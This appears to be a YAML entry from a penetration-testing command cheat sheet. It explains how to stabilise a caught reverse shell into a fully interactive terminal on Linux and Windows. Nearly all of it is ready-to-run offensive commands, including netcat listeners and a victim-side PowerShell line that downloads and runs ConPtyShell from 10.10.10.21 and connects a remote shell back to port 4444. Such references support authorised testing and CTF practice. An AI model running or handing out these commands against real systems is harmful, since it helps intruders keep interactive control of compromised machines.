---
description: |
  Stabilize a raw reverse shell to fully interactive TTY.
command: |
  # Linux — run in order:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  # Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm-256color
  reset

  # No Python? Use script:
  script /dev/null -c bash

  # Readline listener (run before catching shell):
  rlwrap nc -lvnp 4444

  # Windows — ConPtyShell (requires .NET 4.5+):
  # Attacker:
  stty raw -echo; (stty size; cat) | nc -lvnp 4444
  # Victim:
  IEX(IWR http://10.10.10.21/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.10.21 4444
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
  - https://github.com/antonioCoco/ConPtyShell
---
